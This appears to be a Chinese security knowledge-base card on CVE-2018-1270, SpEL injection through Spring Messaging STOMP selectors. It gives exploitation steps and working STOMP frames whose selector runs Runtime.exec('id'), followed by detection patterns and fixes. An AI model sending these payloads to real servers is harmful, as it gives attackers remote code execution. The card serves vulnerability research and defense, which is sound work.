---
id: web-java-expression-spel-spring-messaging-stomp-selector-rce
title: Spring Messaging STOMP selector SpEL 注入 RCE（CVE-2018-1270）
type: scenario
domain: web
path: web/java/expression/spel
technique: spring-messaging-stomp-selector-spel-injection
tags:
- spel
- spring
- spring-messaging
- stomp
- websocket
- rce
- cve-2018-1270
cve:
- CVE-2018-1270
severity: critical
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: Spring Framework 5.0–5.0.4、4.3–4.3.14（修复于 5.0.5/4.3.15）
verification:
  verified_by: verifier-V9
  verified_at: '2026-11-05T01:09:47+08:00'
  notes: 原文无图片，已核对 CVE-2018-1270 原理：STOMP SUBSCRIBE 的 selector 头由 DefaultSubscriptionRegistry 用 SpelExpressionParser + StandardEvaluationContext 求值，消息投递时触发；卡中 STOMP 帧流程与简化 JSON 说明合理。核对时按公开公告修正 affected_versions：实际受影响为 5.0–5.0.4、4.3–4.3.14，修复于 5.0.5/4.3.15（原文写成 5.0–5.0.5，含已修复版本），正文已同步。confidence=medium 合理。未执行 PoC。
url: /docs/web/java/expression/spel/web-java-expression-spel-spring-messaging-stomp-selector-rce/
draft: false
kb_aliases:
- CVE-2018-1270
- Spring WebSocket SpEL 注入
- STOMP selector 注入
- Spring Messaging RCE
- Spring Framework 4.3/5.0 WebSocket RCE
---

## 一句话结论

Spring Messaging 在基于 WebSocket 的 STOMP 简单代理中，会把客户端 `SUBSCRIBE` 帧的 `selector` 头当作 SpEL 表达式解析和求值；攻击者发送包含 `T(java.lang.Runtime).getRuntime().exec(...)` 的 selector，即可在服务端执行任意命令（CVE-2018-1270）。

## 原理

- Spring 的 `spring-messaging` 提供 STOMP over WebSocket 支持，`DefaultSubscriptionRegistry` 负责保存订阅。订阅可以带 `selector` 头，用于按消息头/内容过滤投递。
- `DefaultSubscriptionRegistry` 用 `SpelExpressionParser` 解析 selector，并用 `StandardEvaluationContext` 求值；selector 字符串完全来自客户端，未做类型/方法白名单。
- SpEL 的 `T(...)` 类型引用和 `ReflectiveMethodResolver` 允许调用任意类与方法，因此 selector 中的 `T(java.lang.Runtime).getRuntime().exec('id')` 会在消息过滤阶段执行。
- 该漏洞需要应用把 STOMP 端点暴露给不可信客户端，并使用 Spring 内置的简单 broker（或等价的消息代理配置）处理 `selector`；仅使用原始 WebSocket、不使用 STOMP/selector 的应用不受此路径影响。
- 简化 JSON `{"selectors":["T(java.lang.Runtime)..."]}` 只是客户端库/协议层对 selector 列表的表示；实际协议层应发送带 `selector` 头的 STOMP `SUBSCRIBE` 帧。
## 触发条件

- Spring Framework 受影响版本：5.0–5.0.4、4.3–4.3.14（修复于 5.0.5/4.3.15；原文写成 5.0–5.0.5，包含了已修复版本）。
- 应用启用 STOMP over WebSocket（如 `@EnableWebSocketMessageBroker`），并暴露端点给攻击者。
- 应用使用支持 selector 的订阅注册表（Spring 内置简单 broker 默认支持），且未对 selector 做过滤。
- 攻击者能建立 WebSocket/STOMP 连接，并向某个目的地发送消息以触发 selector 求值。

## 利用步骤

1. 识别 STOMP 端点（常见 `/gs-guide-websocket`、`/websocket`、`/ws`，或 SockJS 的 `/ws/info`）。
2. 建立 WebSocket 连接，发送 STOMP `CONNECT` 帧完成握手。
3. 发送 `SUBSCRIBE` 帧，`destination` 设为可订阅的目的地（如 `/topic/greetings`），`selector` 设为 SpEL payload。
4. 向该目的地发送一条消息（`SEND` 帧，或通过应用接口触发广播），使订阅过滤器对消息求值。
5. 使用回显卡/外带卡获取命令输出；无回显时用 DNS/HTTP 外带验证。

## PoC

STOMP `CONNECT`：

```text
CONNECT
accept-version:1.2
heart-beat:0,0

\0
```

带恶意 selector 的 `SUBSCRIBE`：

```text
SUBSCRIBE
id:sub-0
destination:/topic/greetings
selector:T(java.lang.Runtime).getRuntime().exec('id')

\0
```

触发消息（向同一目的地发送，具体 destination 按应用路由调整）：

```text
SEND
destination:/topic/greetings
content-type:application/json

{"message":"trigger"}\0
```

- 简化 JSON 形式（仅表示 selector 内容，不是完整 STOMP 帧）：

```json
{"selectors":["T(java.lang.Runtime).getRuntime().exec('calc')"]}
```

## 变体与关联

- 变体：selector 中可用 `new java.lang.ProcessBuilder(...)`、`ScriptEngineManager` 等替代 `Runtime.exec`（见绕过卡）。
- 变体：若 selector 被过滤，可尝试字符串拼接、字符数组、Base64 还原（见绕过卡）。
- 变体：无回显时用 `RequestContextHolder`/`StreamUtils` 或 DNS/HTTP 外带（见回显卡）；WebSocket 场景下响应流可能不可用，优先外带。
- 关联：[[web-java-expression-spel-injection-to-rce]]（SpEL 基础执行链）。
- 关联：[[web-java-expression-spel-waf-bypass-scriptengine-reflection]]（selector 过滤绕过）。
- 注意：CVE-2018-1271 的公开描述是 Spring MVC 在 Windows 上从文件系统提供静态资源时的目录穿越，与 SpEL 无关；不要将其与 CVE-2018-1270 混为一谈。

## 检测与防御

- 修复：升级到 Spring Framework 5.0.5+/4.3.15+（以官方公告为准）；无法升级时禁用不必要的 STOMP selector 或限制 STOMP 端点访问。
- 加固：不要把 STOMP 端点暴露给不可信网络；对 `selector` 做严格白名单/长度限制，拒绝 `T(`、`new `、`Runtime`、`ProcessBuilder`、`getClass`、`invoke` 等表达式特征。
- 加固：自定义 `SubscriptionRegistry` 或过滤器，在 selector 进入 `SpelExpressionParser` 前做 AST 级校验；使用受限 `EvaluationContext`（若版本支持）。
- 检测：STOMP `SUBSCRIBE` 帧的 `selector` 头出现 `T(`、`Runtime`、`ProcessBuilder`、`exec`、`getRuntime`、`ScriptEngineManager` 等；WebSocket 连接在短时间内发送大量异常 selector。
- 检测：应用日志出现 `SpelEvaluationException`/`SpelParseException` 且伴随 STOMP 订阅；服务端出现异常子进程或外带 DNS/HTTP 请求。
